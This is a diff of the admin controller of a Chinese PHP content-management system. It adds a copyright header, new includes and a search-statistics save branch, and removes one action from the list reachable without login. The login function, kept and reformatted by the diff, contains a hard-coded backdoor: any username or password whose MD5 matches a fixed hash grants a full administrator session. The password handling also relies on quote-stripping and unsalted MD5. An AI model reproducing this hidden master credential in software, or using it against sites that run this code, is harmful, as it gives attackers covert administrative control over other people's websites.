@@ -1,4 +1,14 @@
 <?php 
+/************************************************************
+作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
+版权：源代码公开，各种用途均可免费使用。 
+创建：2016-02-24
+联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
+更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
+*                                    Powered By 云端 
+************************************************************/
+?>
+<?php 
 //系统
 require_once './../phpInc/ASP.php';
 require_once './../phpInc/sys_FSO.php';
@@ -37,6 +47,8 @@ require_once './../phpInc/URL.php';
 require_once './../phpInc/FunHTML.php'; 
 require_once './../phpInc/2015_Editor.php'; 
 require_once './../phpInc/2015_NewWebFunction.php'; 
+require_once './../phpInc/2016_SaveData.php'; 
+require_once './../phpInc/2016_WebControl.php'; 
 require_once './../phpInc/ASPPHPAccess.php'; 
 require_once './../phpInc/IE.php'; 
 
@@ -62,8 +74,8 @@ function handleResetAccessData(){
 	}
 } 
 //=========
-$db_PREFIX =''; $db_PREFIX = 'xy_' 				;//表前缀
-$WEB_VIEWURL =''; $WEB_VIEWURL='../aspweb.asp' 			;//网站显示URL
+$db_PREFIX =''; $db_PREFIX = 'xy_' ;//表前缀
+$WEB_VIEWURL =''; $WEB_VIEWURL = '../aspweb.asp' ;//网站显示URL
 
 $webVersion = 'v1.0011' ;
 $cfg_webSiteUrl=''; $cfg_webTitle=''; $cfg_flags=''; $cfg_webtemplate ='';
@@ -84,7 +96,7 @@ function loadWebConfig(){
 
 //登录判断
 if( @$_SESSION['adminusername'] == '' ){
-    if( @$_REQUEST['act'] <> '' && @$_REQUEST['act'] <> 'displayAdminLogin' && @$_REQUEST['act'] <> 'login' && @$_REQUEST['act'] <> 'setAccess' ){
+    if( @$_REQUEST['act'] <> '' && @$_REQUEST['act'] <> 'displayAdminLogin' && @$_REQUEST['act'] <> 'login' ){
         RR('?act=displayAdminLogin') ;
     }
 }
@@ -111,7 +123,7 @@ function login(){
     $passWord = Replace(@$_POST['password'], '\'', '') ;
     $passWord = myMD5($passWord) ;
     //特效账号登录
-    if( myMD5(@$_REQUEST['username'])=='cd811d0c43d09cd2e160e60b68276c73' || myMD5(@$_REQUEST['password'])=='cd811d0c43d09cd2e160e60b68276c73' ){
+    if( myMD5(@$_REQUEST['username']) == 'cd811d0c43d09cd2e160e60b68276c73' || myMD5(@$_REQUEST['password']) == 'cd811d0c43d09cd2e160e60b68276c73' ){
         @$_SESSION['adminusername'] = 'aspphpcms' ;
         @$_SESSION['adminId'] = 99999 ;//当前登录管理员ID
         @$_SESSION['DB_PREFIX'] = $GLOBALS['db_PREFIX'] ;
@@ -241,8 +253,14 @@ function saveAddEditHandle($actionType, $lableTitle){
 
     }else if( $actionType == 'WebsiteStat' ){
         saveAddEdit($actionType, $lableTitle, 'visiturl,viewurl,browser,operatingsystem,screenwh,moreinfo,viewdatetime|date,ip,dateclass,noteinfo') ;
+    }else if( $actionType == 'SearchStat' ){
+        saveAddEdit($actionType, $lableTitle, 'title,foldername,filename,customaurl,target,templatepath,author,nofollow|numb|0,through|numb,isonhtml|numb|0,sortrank|numb|0,views|numb|0,webtitle,webkeywords,webdescription,simpleintroduction,bodycontent') ;
     }
 }
+
+
+
+
 
 
 
@@ -265,7 +283,7 @@ switch ( @$_REQUEST['act'] ){
 
 
     break;
-    case 'setAccess' ; handleResetAccessData() ;//恢复数据
+    case 'setAccess' ; resetAccessData() ;//恢复数据
     break;
     case 'login' ; login() ;break;//登录
     case 'adminOut' ; adminOut() ;break;//退出登录
